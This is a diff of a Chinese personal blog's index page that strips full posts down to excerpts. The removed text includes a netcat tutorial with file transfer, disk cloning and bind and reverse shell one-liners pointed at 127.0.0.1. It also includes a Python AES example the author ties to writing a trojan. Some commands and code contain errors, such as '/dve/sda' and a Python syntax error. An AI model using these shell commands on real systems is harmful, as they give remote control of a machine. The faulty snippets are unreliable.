-<p>这里服务器即可发送文件，也能接受文件，不用再将文件源做服务器，‘&gt;’是shell里的重定向，玩linux应该都知道。。。</p>
-<h5 id="目录传输"><a href="#目录传输" class="headerlink" title="目录传输"></a>目录传输</h5><p>传输目录也就是打包，压缩文件(可选）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Server:</span><br><span class="line">tar -cvf - dirname | bzip2 -z | nc -l 9999</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Client:</span><br><span class="line">nc -n 127.0.0.1 9999 | bzip2 -d | tar -xvf -</span><br></pre></td></tr></table></figure>
-<h3 id="3-克隆设备"><a href="#3-克隆设备" class="headerlink" title="3.克隆设备"></a>3.克隆设备</h3><p>将配置好的linux机器重复同样操作对其他机器,骚操作。。。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Server:</span><br><span class="line">dd if=/dve/sda | nc -l 9999</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Client:</span><br><span class="line">nc -n 127.0.0.2 | dd of=/dev/sda</span><br></pre></td></tr></table></figure>
-<h3 id="4-打开shell"><a href="#4-打开shell" class="headerlink" title="4.打开shell"></a>4.打开shell</h3><h5 id="正向shell"><a href="#正向shell" class="headerlink" title="正向shell"></a>正向shell</h5><p>客户端得到服务器shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Server:</span><br><span class="line">nc -l 9999 -e /bin/bash -i</span><br></pre></td></tr></table></figure></p>
-<p>不过 -e 好像不好使了。。。不过可以这样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Client:</span><br><span class="line">mkfifo /tmp/tmpfifo</span><br><span class="line">cat /tmp/tmpfifo | /bin/sh -i 2&gt;&amp;1 | nc -l 9999 &gt; /tmp/tmpfifo</span><br></pre></td></tr></table></figure></p>
-<p>linux下进程间通信必须通过内核提供的通道，而命名管道fifo文件就是其中之一。<br>从网络收到的输入写到fifo文件中<br>cat 命令读取fifo文件并且其内容发送给sh命令<br>sh命令进程受到输入并把它写回到netcat。<br>netcat 通过网络发送输出到client</p>
-<p>至于为什么会成功是因为管道使命令平行执行，fifo文件用来替代正常文件，因为fifo使读取等待而如果是一个普通文件，cat命令会尽快结束并开始读取空文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Client:</span><br><span class="line">nc -n 127.0.0.1 9999</span><br></pre></td></tr></table></figure></p>
-<h5 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向shell</h5><p>服务器得到客户端shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Server:</span><br><span class="line">nc -l 9999</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Client:</span><br><span class="line">cat /tmp/tmpfifo | /bin/sh -i 2&gt;&amp;1 | nc -n 127.0.0.1 9999 &gt; /tmp/tmpfifo</span><br></pre></td></tr></table></figure>
-<p><strong>指定客户端端口，用 -p port</strong></p>
-<h3 id="5-指定源地址"><a href="#5-指定源地址" class="headerlink" title="5.指定源地址"></a>5.指定源地址</h3><p>假设你的机器有多个地址，希望明确指定使用哪个地址用于外部数据通讯。用-s制定 ip<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Server</span><br><span class="line">nc -u -l 9999 &lt;file.txt</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Client</span><br><span class="line">nc -u 127.0.0.1 9999 -s 196.168.1.3 &gt; file.txt</span><br></pre></td></tr></table></figure>
-<p>参考文章:<br>以上内容主要来自这里:<a href="https://www.oschina.net/translate/linux-netcat-command" target="_blank" rel="noopener">https://www.oschina.net/translate/linux-netcat-command</a></p>
-
-          
+          &emsp;&emsp;netcat，瑞士军刀，通过tcp和udp在网络读写数据。能和其他工具或脚本结合使用，做出amazing thing！！你可以通过它做服务器，聊天，传输、下载数据等等。。下面学习一些实例：
+1.聊天Server—listening1nc -l 9999
+Client—conn
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/10/28/nc—网络瑞士军刀/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1302,24 +1242,16 @@
       
         
           
-            <p>&emsp;&emsp;最近学着堆溢出的各种花式操作时，头快炸了。因此想换个知识过渡一下，一直对木马和病毒有兴趣，想了解具体的实现。今天写木马时遇到了加密的问题，记录一下。</p>
-<h3 id="AES简介"><a href="#AES简介" class="headerlink" title="AES简介"></a>AES简介</h3><p>&emsp;&emsp;AES: Advanced Encryption Standard(高级加密标准),在密码学中又称Rijndael加密法,该算法由比利时密码学家Joan Daemen和Vincent Rijmen所设计，是对称密钥加密中最流行的算法之一。</p>
-<ul>
-<li>AES有5种加密操作模式：<blockquote>
-<p>电码本模式（Electronic Codebook Book (ECB)）<br>密码分组链接模式（Cipher Block Chaining (CBC)）<br>计算器模式（Counter (CTR)）<br>密码反馈模式（Cipher FeedBack (CFB)）<br>输出反馈模式（Output FeedBack (OFB)）</p>
-</blockquote>
-</li>
-</ul>
-<h3 id="常见算法说明"><a href="#常见算法说明" class="headerlink" title="常见算法说明"></a>常见算法说明</h3><h5 id="1-摘要算法"><a href="#1-摘要算法" class="headerlink" title="1.摘要算法"></a>1.摘要算法</h5><p>&emsp;&emsp;代表：MD5，SHA1。摘要算法是一个不可逆过程<br>&emsp;&emsp;用途：验证消息完整性，安全访问认证，数字签名。</p>
-<h5 id="2-对称加密算法"><a href="#2-对称加密算法" class="headerlink" title="2.对称加密算法"></a>2.对称加密算法</h5><p>&emsp;&emsp;代表：AES，DES。对称加密算法是为了区分非对称加密。<br>&emsp;&emsp;特点：加解密同一密钥，与非对称密钥不一样（有公钥和私钥）<br>&emsp;&emsp;用途：对大型数据加密，加密速度快。</p>
-<h5 id="3-非对称加密算法"><a href="#3-非对称加密算法" class="headerlink" title="3.非对称加密算法"></a>3.非对称加密算法</h5><p>&emsp;&emsp;代表：RSA，Elgamal。非对称加密体系不要求通信双方事先传递密钥或有任何约定就能完成保密通信。<br>&emsp;&emsp;特点：安全性强，密钥管理方便。</p>
-<h5 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h5><p>&emsp;&emsp;一般一次数据的传输是几种加密算法的结合，确保数据完整，安全，保密。<br>&emsp;&emsp;先简要了解各种算法，以后再深入了解相关数学原理和破解原理实现，毕竟咱是要走hack路线的。。。</p>
-<h3 id="python-AES-实现"><a href="#python-AES-实现" class="headerlink" title="python AES 实现"></a>python AES 实现</h3><p>&emsp;&emsp;python中已经有实现AES算法的库了——pycrypto，非标准库，需安装。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pycrypto</span><br></pre></td></tr></table></figure></p>
-<p>&emsp;&emsp;python AES中CBC模式的实现，仅适用<strong>python3</strong>.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment">#coding:UTF-8</span></span><br><span class="line"><span class="comment">############################</span></span><br><span class="line"><span class="comment">#File Name:aes1.py</span></span><br><span class="line"><span class="comment">#Author: shishen</span></span><br><span class="line"><span class="comment">#Mail: shishenwozuile@gmail.com</span></span><br><span class="line"><span class="comment">#Created Time: 2017-10-27 22:22:43</span></span><br><span class="line"><span class="comment">############################</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment">#padding 算法，填充作用</span></span><br><span class="line">SZ = AES.block_size <span class="comment"># AES数据分组为128bit，即16字节</span></span><br><span class="line">pad = <span class="keyword">lambda</span> s: s + (SZ - len(s.encode(<span class="string">'utf-8'</span>)) % SZ) *chr(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aes</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, key, mode)</span>:</span></span><br><span class="line">		<span class="comment">#加密时使用的key，16（AES-128）、24（AES-192）、或32（AES-256）</span></span><br><span class="line">		self.key = key  </span><br><span class="line">		self.mode = mode	<span class="comment">#加密模式</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(self, text)</span>:</span></span><br><span class="line">		<span class="comment">#生成随机初始向量IV</span></span><br><span class="line">		iv = Random.new().read(SZ)</span><br><span class="line">		<span class="comment">#生成指定mode加密算法对象</span></span><br><span class="line">		cryptor = AES.new(self.key, self.mode, iv)</span><br><span class="line">		cryptext = cryptor.encrypt(pad(text))  <span class="comment">#加密</span></span><br><span class="line">		<span class="comment">#将密文进行编码，便于传输,decode去掉b</span></span><br><span class="line">		<span class="keyword">return</span> base64.b64encode(iv + cryptext).decode(<span class="string">'utf-8'</span>) </span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(self, cryptext)</span>:</span></span><br><span class="line">		cryptext = base64.b64decode(cryptext.encode(<span class="string">'utf-8'</span>)) <span class="comment">#解码</span></span><br><span class="line">		iv = cryptext[<span class="number">0</span>:SZ]	</span><br><span class="line">		cryptext = cryptext[SZ:len(cryptext)]	<span class="comment">#密文</span></span><br><span class="line">		cryptor = AES.new(self.key, self.mode, iv)</span><br><span class="line">		text = cryptor.decrypt(cryptext).decode(<span class="string">'utf-8'</span>) <span class="comment">#解密</span></span><br><span class="line">		<span class="keyword">return</span> text.rstrip(chr(<span class="number">0</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	ed = aes(<span class="string">b'iamthehellowolrd'</span>, AES.MODE_CBC) CBC模式</span><br><span class="line">	<span class="comment">#argv[1] 需要加密的明文</span></span><br><span class="line">	e = ed.encrypt(sys.argv[<span class="number">1</span>])	</span><br><span class="line">	d = ed.decrypt(e)</span><br><span class="line">	print(<span class="string">"加密： "</span>,e)</span><br><span class="line">	print(<span class="string">"解密： "</span>,d)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure></p>
-<p>&emsp;&emsp;强调一下<strong>AES是对称加密算法，加解密的密钥相同</strong>,我们来看一下运行结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pi@raspberrypi:~/python11/AES $ python3 aes1.py &quot;你好啊，世界！I aM&quot;</span><br><span class="line">加密：  3ILPw0i+V2hGadHBq883r/N3bY9MZGyBTpGq+oRRNu5GOmxY1NY+BJSxeOewugNk</span><br><span class="line">解密：  你好啊，世界！I aM</span><br></pre></td></tr></table></figure></p>
-<p>&emsp;&emsp;这里还要说一下<strong>base64</strong>，base64不是加密算法，而是一种编码算法。那么为什么用base64呢？<br>&emsp;&emsp; Base64是一种基于64个可打印字符来表示二进制的表示方法，一般用于网络传输,为了支持某些只识别ascii字符的系统。并且有些协议和设备不支持不可见字符传输(产生冲突，错误)，只能传输可打印字符(在ASCII码中规定，0~31、128这33个字符属于控制字符，32~127这95个字符属于可打印字符)，而base64可将不可见字符转换为可见字符，用于传输。</p>
-
-          
+          &emsp;&emsp;最近学着堆溢出的各种花式操作时，头快炸了。因此想换个知识过渡一下，一直对木马和病毒有兴趣，想了解具体的实现。今天写木马时遇到了加密的问题，记录一下。
+AES简介&emsp;&emsp;AES: Advanced Encryption Standard(高级加密标准),在密码学
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/10/28/学习-python3-AES/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1490,8 +1422,15 @@
       
         
           
-            <h3 id="你好啊，李银河！当我跨过沉沦的一切，向着永恒开战的时候，你是我的军旗。——王小波"><a href="#你好啊，李银河！当我跨过沉沦的一切，向着永恒开战的时候，你是我的军旗。——王小波" class="headerlink" title="你好啊，李银河！当我跨过沉沦的一切，向着永恒开战的时候，你是我的军旗。——王小波"></a>你好啊，李银河！当我跨过沉沦的一切，向着永恒开战的时候，你是我的军旗。<div style="text-align:right">——王小波</div></h3>
+          你好啊，李银河！当我跨过沉沦的一切，向着永恒开战的时候，你是我的军旗。——王小波
           
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/10/21/hello-world/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
